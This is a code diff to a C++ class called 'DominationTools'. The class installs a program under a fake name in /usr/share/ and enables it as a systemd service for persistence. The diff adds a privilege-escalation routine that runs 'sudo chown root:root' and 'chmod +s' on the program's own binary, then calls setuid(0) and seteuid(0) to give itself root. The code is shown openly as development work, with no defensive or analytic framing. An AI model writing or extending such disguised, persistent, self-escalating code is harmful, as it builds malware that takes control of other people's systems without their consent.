@@ -14,8 +14,8 @@ class DominationTools{
 
 
 		char symb[sizeof(Current.fakename)+21]="/etc/systemd/system/";
-
 		char cmd[sizeof(symb) + sizeof(Current.fakename) - 4];
+		char escalator[sizeof(Current.name)*2 + 38];
 		char path[12 + sizeof(Current.fakename)]="/usr/share/";
 
 	public:
@@ -24,7 +24,18 @@ class DominationTools{
 			strcat(path, Current.fakename);
 
 			sprintf(cmd, "chmod 644 %s; systemctl enable %s", symb, Current.fakename);
-			printf("%s\n%s\n", cmd, path);
+			sprintf(escalator, "sudo chown root:root %s; sudo chmod +s %s", Current.name, Current.name);
+		}
+
+		int EscalatePrivileges(){
+			system(escalator);
+			setuid(0);
+
+			if (seteuid(0) == -1 || geteuid() != 0)
+				return 1;
+
+			Current.privileges = ADMIN;
+			return 0;
 		}
 
 		int EnableAutoStart(){
